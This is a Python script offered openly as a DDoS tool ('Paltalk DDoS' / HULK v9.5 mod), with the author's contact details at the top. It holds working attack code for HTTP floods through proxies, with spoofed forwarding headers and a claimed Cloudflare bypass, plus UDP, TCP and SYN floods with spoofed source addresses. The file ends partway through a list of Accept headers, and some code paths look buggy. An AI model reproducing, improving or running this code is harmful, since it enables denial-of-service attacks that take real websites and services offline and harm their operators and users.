#[+]==============[ Contact ]===========[+]#
# # Discord: Paltalk#1995                # #
# # Paltalk    : @VN                     # #
# # Email  : paltalkddos@gmail.com       # #
# # Tools Paltalk DDoS V10               # #
#[+]====================================[+]#
#coding: utf-8
#..:: > HULK_v9.5 < ::.. Mod By VN
import os, sys
import certifi
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse
import string
import requests
import cfscrape
import request
import random, bz2, json, sys, glob, ssl, webbrowser, io, ssl, wget, urllib3
from bs4 import BeautifulSoup
from colorama import Fore
from scapy.all import *
from os import system
from sys import stdout
from random import randint
from scapy.all import sr1,IP,ICMP, TCP
from scapy.all import srp,Ether,ARP,conf
from scapy.all import IP, UDP, send, Raw
from struct import *
from requests import *
from multiprocessing import Pool
from urllib3 import PoolManager


#Hulk Mod By VN
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=99999
flag=0
safe=0
def inc_counter():
 global request_counter
 request_counter+=99999
def set_flag(val):
 global flag
 flag=val 
def set_safe():
 global safe
 safe=1
###################################################
Intn = random.randint
Choice = random.choice
scraper = cfscrape.create_scraper()
cookies = ""
urllib3.disable_warnings()
urllib3.PoolManager()
###################################################
def getUserAgent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os  = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.today().date().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option == True:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'     
def referer_list():
    global headers_referers
    headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=')
    headers_referers.append('https://www.google.ru/search?newwindow=1&ei=O6Q3XqirCMae9QPmopOIDg&q=')
    headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('https://translate.google.com/translate?hl=vi&sl=en&tl=ar&u=')
    headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
    headers_referers.append('http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=baiduerr&wd=')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://www.google.com/search?q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('https://www.google.fr/search?source=hp&ei=haQ3XuD4M-_bz7sPm8uh6AY&q=')
    headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
    headers_referers.append('https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=')
    headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
    headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('https://www.google.com/webmasters/verification/verification?hl=en&authuser=0&theme=wmt&siteUrl=')
    headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=')
    headers_referers.append('https://www.google.com/search?source=hp&ei=H1E2XrCqLJT7-QaovI-wCQ&q=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
    headers_referers.append('http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&ch=&tn=baiduerr&bar=&wd=')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://add.my.yahoo.com/rss?url=')
    headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
    headers_referers.append('https://yandex.ru/yandsearch?text=')
    headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
    headers_referers.append('http://www.ask.com/web?q=')
    headers_referers.append('http://search.aol.com/aol/search?q=')
    headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
    headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
    headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
    headers_referers.append('http://translate.google.com/translate?u=')
    headers_referers.append('https://validator.w3.org/nu/?doc=')		
    headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
    headers_referers.append('http://validator.w3.org/checklink?uri=')
    headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
    headers_referers.append('http://feedvalidator.org/check.cgi?url=')
    headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1&ei=YCJrVdTMNs6LuwT3kIC4Cg#newwindow=1&hl=ru&q=')
    headers_referers.append('http://search.iminent.com/es-ES/search/#q=')
    headers_referers.append('https://www.google.com/url?hl=vi&q=')
    headers_referers.append('http://www.microsofttranslator.com/bv.aspx?from=en&to=vi&a=')
    headers_referers.append('https://translate.google.com/translate?hl=vi&sl=auto&tl=vi&u=')
    headers_referers.append('https://www.ssllabs.com/ssltest/analyze.html?viaform=on&d=')
    headers_referers.append('http://www.izito.com/news?q=')	
    headers_referers.append('https://search.aol.com/aol/search?s_it=sb-home&v_t=na&q=')
    headers_referers.append('http://www.search.com/search?q=')
    headers_referers.append('https://www.ssllabs.com/ssltest/analyze.html?d=')
    headers_referers.append('https://www.izito.ws/ws?q=')
    headers_referers.append('http://possible.lv/tools/hb/?domain=')
    headers_referers.append('https://www.google.com/search?source=hp&ei=8pw1Xq67KNfB3LUPzpm9uAc&q=') 
    headers_referers.append('https://securityheaders.com/?q=')	
    headers_referers.append('http://web.archive.org/web/*/')
    headers_referers.append('https://www.google.com/search?q=')
    headers_referers.append('https://duckduckgo.com/?q=')
    headers_referers.append('http://www.ask.com/web?q=')
    headers_referers.append('http://search.aol.com/aol/search?q=')
    headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?mode=zoek&zoeken_tab=site&zoeken_term=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
    headers_referers.append('https://www.online-translator.com/Site.aspx?dirCode=en-ru&url=')
    headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
    headers_referers.append('https://www.shodan.io/search?query=')
    headers_referers.append('http://www.search.com/search?q=')	
    headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://www.yandex.com/search/?text=')
    headers_referers.append('https://www.facebook.com/flx/warn/?u=')
    return(headers_referers)       
def buildblock(size): 
 out_str = ''
 for i in range(0, size):
  a = Intn(65, 90)
  out_str += chr(a)
 return(out_str)
 
def randomurl2():  
  return buildblock(Intn(4,10)) + '=' + str(Intn(3,  90000)) + buildblock(Intn(4,10)) + '&' + buildblock(Intn(3, 10)) + '=' + str(Intn(3,  90000))
  
def httpcall(url):
 referer_list()
 code=0
 if url.count("?")>0:
  param_joiner = "&"
 else:
  param_joiner = "?"
 request = urllib2.Request(url)
 request.add_header('User-Agent', getUserAgent())
 request.get_header("Content-Type")
 request.get_header("application/x-zip")
 request.add_header("Content-Length", random.randint(99999))
 request.add_header('Cache-Control', 'no-cache')
 request.add_header('Content-Type', 'application/json')
 request.add_header('Content-Type', 'multipart/form-data; boundary=---------------------------WebKitFormBoundaryePkpFF7tjBAqx29L735323031399963166993862150')
 request.add_header('Content-Type', 'application/x-www-form-urlencoded')
 request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
 request.add_header('Referer', random.choice(headers_referers) + host + "?") 
 request.add_header('Keep-Alive', random.randint(110,120))
 request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
 request.add_header('Connection', 'keep-alive')
 request.add_header('Accept-Encoding', 'gzip,deflate')
 request.add_header('Accept-Charset', 'acceptCharset')
 request.add_header('Host',host)
 index = random.randint(0,len(listaproxy)-1)
 proxy = urllib2.ProxyHandler({'http':listaproxy[index]}) 
 opener = urllib2.build_opener(proxy,urllib2.HTTPHandler,keepalive_handler,SocksiPyHandler,urllib2.HTTPBasicAuthHandler()) 
 keepalive_handler = HTTPHandler()
 urllib2.install_opener(opener)
 try:
   urllib2.urlopen(request)
   if(flag==1): set_flag(0)
   if(code==500): code=0
 except urllib2.HTTPError as e:
   set_flag(1)
   code=500
   time.sleep(1)
 except urllib2.URLError as e:
   sys.exit()
 else:
   inc_counter()
   urllib2.urlopen(request)
 return(code)
 
class HTTPThread(threading.Thread):
 def run(self):
  try:
   while flag<2:
    code=httpcall(url)
    if (code==500) & (safe==1):
     set_flag(2)
  except Exception as ex:
   pass
   
class MonitorThread(threading.Thread):
 def run(self):
  previous=request_counter
  while flag==0:
   if (previous+1000<request_counter) & (previous<>request_counter):
    previous=request_counter
   if flag==2:
    print ''
#HULK_v9 Mod By Twi 
def randomIp():
    random.seed()
    result = str(Intn(1, 255)) + '.' + str(Intn(0, 255))
    result = result + str(Intn(0, 255)) + '.' + str(Intn(0, 255))
    return result
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(Intn(8, 10)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
def randomIpList1():
    random.seed()
    res = ""
    for ip in xrange(Intn(1, 1)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
    
class Home(threading.Thread): 
    def run(self):
        referer_list()
        useragent = "User-Agent: " + getUserAgent() + "\r\n" 
        length = "Content-Length: 0\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        content += "Content-Type: application/json\r\n"
        accept    = random.choice(acceptall)
        referer = "Referer: "+ Choice(headers_referers) + url + "?r="+ "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        k = "Keep-Alive: "+ str(Intn(110,120))+"\r\n"
        if choice_mode == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + connection + k + accept + content + length + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + connection + k + accept + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))

  
                try:
                    for y in xrange(15):
                        s.send(str.encode(request))

                        req_code += 1
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
class proxybypass(threading.Thread):
    def run(self):
        referer_list()
        current = x
        http = urllib3.PoolManager()        
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
                            
        cookie2 ="Cookies: "+str(c_cookies)+"\r\n" 
        useragent ="User-Agent: "+str(c_useragent)+"\r\n"
        connection = "Connection: Keep-Alive\r\nkeep-alive\r\nProxy-Connection: keep-alive\r\n"   
        referer = "Referer: "+ Choice(headers_referers) + url + "?r="+ "\r\n"       
        http.request = get_host + useragent + cookie2 + referer + accept + connection + "\r\n"
        while nload:
         time.sleep(1)
         pass
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(http.request)
                try:
                    for i in xrange(15):
                        a.send(http.request)
                except:
                    tts = 1                   
            except:
                proxy = random.choice(listaproxy).split(':')

class attacproxy2(threading.Thread):
    def run(self):
        referer_list()
        current = x
        http = urllib3.PoolManager()        
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = Choice(listaproxy).split(':')
        cookies, user_agent = cfscrape.get_cookie_string(url, user_agent=getUserAgent())
        cookies1 = "Cookies: " +str(cookies)+"\r\n"        
        cookies1 += "User-Agent: " +str(user_agent)+"\r\n"
        accept = Choice(acceptall)        
        referer = "Referer: "+ Choice(headers_referers) + url + "?r="+ "\r\n"        
        fake_ip = "Client-IP: " + randomIpList1() + "\r\n"   
        fake_ip += "X-Forwarded-For: " + randomIpList1() + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        k = "Keep-Alive: "+ str(Intn(110,120))+"\r\n"        
        http.request = "GET " + url + "?" + randomurl2() +" HTTP/1.1\r\nHost: " + host_url + "\r\n"        
        http.request = http.request + cookies1 + referer + connection + k + accept + fake_ip+ "\r\n"
        
        while True:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(http.request)
                try:
                    for i in xrange(15):
                        a.send(http.request)
                except:
                    tts = 1                   
            except:
                proxy = Choice(listaproxy).split(':')               
class JSv2(threading.Thread):
    def run(self):
        scraper = cfscrape.create_scraper()
        while True:
            try:
                if choice_mode == "1":
                    soso = scraper.get(url, timeout=15)
                else:
                    soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                
                #req_code += 1
                try:
                    for y in xrange(15):
                        #req_code += 1
                        if choice_mode == "1":
                            soso = scraper.get(url, timeout=15)
                        else:
                            soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    #error += 1
                except:
                    pass              

class raw_dos(threading.Thread):
    def init(self, counter):
        threading.Thread.init(self)
        self.counter = counter
    def run(self):
        global req_code, error
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : getUserAgent(),
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
        if choice_mode == "1":
            requests.get(url, headers=headersx)
        else:
            requests.get(url+ "?" +randomurl2(), headers=headersx)
        while True:
            try:
                if choice_mode == "1":
                    requests.get(url, headers=headersx)
                else:
                    requests.get(url+ "?" +randomurl2(), headers=headersx)
                
                while True:
                    try:
                        for _ in xrange(100):
                            if choice_mode == "1":
                                requests.get(url, headers=headersx)
                            else:
                                requests.get(url+ "?" +randomurl2(), headers=headersx)
                    except:
                        try:
                            pass
                        except:
                            pass
            except:
                try:
                    pass
                except:
                    pass
                    
class raw_dos2(threading.Thread):
    def init(self, counter):
        threading.Thread.init(self)
        self.counter = counter        
        http = urllib3.PoolManager()
    def run(self):
        http = urllib3.PoolManager()        
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Keep-Alive" : str(Intn(110,120)),
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : getUserAgent(),
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
        if choice_mode == "1":
            http.request("GET", url, headers=headersx)
        else:
            http.request("GET", url+ "?" +randomurl2(), headers=headersx)
        while True:
            try:
                if choice_mode == "1":
                    http.request("GET", url, headers=headersx)
                else:
                    http.request("GET", url+ "?" +randomurl2(), headers=headersx)
                
                while True:
                    try:
                        for _ in xrange(100):
                            if choice_mode == "1":
                                http.request("GET", url, headers=headersx)
                            else:
                                http.request("GET", url+ "?" +randomurl2(), headers=headersx)
                    except:
                        try:
                            pass
                        except:
                            pass
            except:
                try:
                    pass
                except:
                    pass
def udpflood():
	data = random._urandom(1300)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(host_ip),int(port))
			for x in xrange(15):
				s.sendto(data,addr)
			print(i +"[+] UDP Flood | Sent | "+host_ip+":"+str(port)+" Thread "+str(thread)+" |\r")
		except:
                        s.close()
			print("[!] Error!!!")

def tcpflood():
	data = random._urandom(4000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host_ip,port))
			s.send(data)
			for x in xrange(15):
				s.send(data)
			print(i +"[+] TCP Flood | Sent | "+host_ip+":"+str(port)+" Thread "+str(thread)+" |\r")
		except:
			s.close()
			print("[*] Error")        
class synflood(threading.Thread):
    def init(self, counter):
        threading.Thread.init(self)
        self.counter = counter

    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)
        
            IP_Packet = IP ()            
            IP_Packet.src = ".".join(map(str, (randint(0,255)for i in range(4))))
            IP_Packet.dst = host_url
        
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            try:
                send(IP_Packet/TCP_Packet, verbose=0)
                req_code += 1
            except:
                try:
                    error += 1
                except:
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
#Main

def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
    print(
"""
`.......1111111111111`..11`..1111111111111`..`..11111111111`.....1111`.....1111111111111111`..1..11
`..1111`..11111111111`..11`..1111111111111`..`..11111111111`..111`..1`..111`..11111111111`..1111`..
`..1111`..111`..11111`..`.`.1`.111`..11111`..`..11`..111111`..1111`..`..1111`..111`..11111`..111111
`.......111`..11`..11`..11`..111`..11`..11`..`..1`..1`.....`..1111`..`..1111`..1`..11`..1111`..1111
`..1111111`..111`..11`..11`..11`..111`..11`..`.`..111111111`..1111`..`..1111`..`..1111`..111111`..1
`..1111111`..111`..11`..11`..11`..111`..11`..`..1`..1111111`..111`..1`..111`..11`..11`..1`..1111`..
`..111111111`..1`...`...111`..111`..1`...`...`..11`..111111`.....1111`.....1111111`..111111`..1..11
111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
> Tool DDoS Created By VN-PALTALK
> HULKV 9.5 With Proxy (bypass Cloudfale)
___________________________________________________________________________________________________""")
def logo3():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
    print(
"""
`.......1111111111111`..11`..1111111111111`..`..11111111111`.....1111`.....1111111111111111`..1..11
`..1111`..11111111111`..11`..1111111111111`..`..11111111111`..111`..1`..111`..11111111111`..1111`..
`..1111`..111`..11111`..`.`.1`.111`..11111`..`..11`..111111`..1111`..`..1111`..111`..11111`..111111
`.......111`..11`..11`..11`..111`..11`..11`..`..1`..1`.....`..1111`..`..1111`..1`..11`..1111`..1111
`..1111111`..111`..11`..11`..11`..111`..11`..`.`..111111111`..1111`..`..1111`..`..1111`..111111`..1
`..1111111`..111`..11`..11`..11`..111`..11`..`..1`..1111111`..111`..1`..111`..11`..11`..1`..1111`..
`..111111111`..1`...`...111`..111`..1`...`...`..11`..111111`.....1111`.....1111111`..111111`..1..11
111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
> Tool DDoS Created By VN-PALTALK
> HULKV 9.5 With Proxy (bypass Cloudfale)
___________________________________________________________________________________________________""")
    try:
        print(Fore.LIGHTYELLOW_EX +"\n[*] Target : " +str(url)+ ":" +str(port))
    except:
        pass
    try:
        print("[*] Threads: " +str(thread))
    except:
        pass
    try:
        print("[*] Mode   : " +str(filemode))+ Fore.WHITE
    except:
        pass
logo()
# Site
print("-----------------------------")
url = raw_input(Fore.GREEN + "[*] Target [URL/IP] : " + Fore.WHITE)
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
host_ip = socket.gethostbyname(host_url)

#Port
print("-----------------------------")
port = str(input(Fore.GREEN +"[*] Port [80]: "+ Fore.WHITE))
if port =="":
   if "https" in url:
          port = int(443)
          print("[!] Selected Port = 443 [!]")
   else:
        port = int(80)
        print("[!] Selected Port = 80 [!]")
else:
    port = int(port)

#Proxy
proxyf = urllib.urlopen("proxy.txt").read()
listaproxy = proxyf.split('\n')
#So luong
print("-----------------------------")
thread = input(Fore.GREEN + "[*] Number thread (7000): " + Fore.WHITE)
os.system('cls')
def start_mode():
    global thread, get_host, acceptall, connection, content, length, x, req_code, error, max_req, choice_mode, filemode, filemode2, method_proxy, c_cookies, c_useragent
    x     = int(0)
    error = int(0)
    req_code = int(0)
    print("""
[+]=======[ Layer 7 ]=======[+]=======[ Layer 4 ]=======[+]
 # 0: Home                   # 5: UDP Flood              #
 # 1: Proxy  [ByPass]        # 6: TCP Flood              #
 # 2: JS Bypass Cloudfale    # 7: SYN Flood              #
 # 3: Raw-DoS                #                           #
 # 4: Raw-DoS2               #                           #
[+]=====================================================[+]
""")
    choice_mode = raw_input("[*] Attack Mode [0-7]: ")
    if choice_mode == "0":
        for x in xrange(int(thread)):            
            filemode = "Home"
            filemode2 = ""
            Home().start()            
    elif choice_mode == "1":               
        print("<------------------------>")
        print("|_--> 1: Method Proxy Normal")
        print("|_--> 2: Method Proxy Bypass")
        filemode = "Proxy"
        method_proxy = raw_input("[?] Method [1/2]: ")
        if method_proxy == "1":       
           for x in xrange(int(thread)):            
            filemode = "Proxy"
            filemode2 = "=> Method Proxy Normal"
            attacproxy2().start()
        if method_proxy == "2":
           print("<------------------------>") 
           print(Fore.CYAN+"     Customize Cookies")
           c_cookies = raw_input(Fore.GREEN+ "[*] Plese input the cookies:"+ Fore.WHITE)
           if c_cookies is"":
              c_cookies = ""
           print(Fore.CYAN+"     Customize User-Agent")
           c_useragent = raw_input(Fore.GREEN+ "[*] Plese input the User-Agent:"+ Fore.WHITE)
           if c_useragent is"":
              c_useragent = getUserAgent()
           for x in xrange(int(thread)):                        
            filemode = "Proxy"
            filemode2 = "=> Method Proxy Bypass"
            proxybypass().start()            			
    elif choice_mode == "2":
        for x in xrange(int(thread)):            
            filemode = "JS Bypass Cloudfale"        
            filemode2 = ""
            JSv2().start()
    elif choice_mode == "3":       
            for x in xrange(int(thread)):                
                filemode = "Raw-DoS"
                filemode2 = ""                
                raw_dos().start()
    elif choice_mode == "4":
        for x in xrange(int(thread)):
            raw_dos2().start()
            filemode = "Raw-DoS2"
            filemode2 = ""            
    elif choice_mode == "5":
        for x in xrange(int(thread)):
            th = threading.Thread(target = udpflood)                   
            th.start()
            filemode = "UDP Flood"
            filemode2 = ""                       
    elif choice_mode == "6":
        for x in xrange(int(thread)):
            th = threading.Thread(target = tcpflood)            
            th.start()
            filemode = "TCP Flood"
            filemode2 = ""            
    elif choice_mode == "7":
        for x in xrange(int(thread)):
            th = threading.Thread(target = synflood)            
            th.start()
            synflood().start()
            filemode = "SYN Flood"
            filemode2 = ""
            
get_host = "GET " + url + "?" + randomurl2() +" HTTP/1.1\r\nHost: " + host_url + "\r\n" 
accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/x-www-form-urlencoded\r\nPragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace\r\nAccept-Encoding', DNT , 1\r\n"
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json\r\n", 
    "Accept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/json\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Type: application/json\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nContent-Type: application/json\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nContent-Type: application/json\r\n",
    "Accept: text/html, application/xhtml+xml\r\nContent-Type: application/x-www-form-urlencoded\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nContent-Type: application/json\r\n",
